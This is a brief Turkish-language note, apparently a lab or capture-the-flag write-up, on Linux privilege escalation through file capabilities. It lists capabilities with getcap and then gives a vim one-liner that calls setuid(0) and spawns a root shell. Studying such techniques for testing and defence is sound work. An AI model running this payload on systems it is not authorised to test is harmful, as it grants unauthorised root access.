Ayrıcalık Yükseltme Yetenekleri:

*** getcap ile priv esc ***


```bash
getcap -r / 2>/dev/null
``` 
![image](https://github.com/user-attachments/assets/41681c69-e0f1-4cfd-9b96-1fd99781a0b2)

daha sonra

![image](https://github.com/user-attachments/assets/f433e7ef-4b5a-422f-882e-b293290ead65)

Vim'in aşağıdaki komut ve yük ile kullanılabileceğini fark ediyoruz:
```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
![image](https://github.com/user-attachments/assets/fda3d99b-ff2c-431b-8742-920c643d51a0)
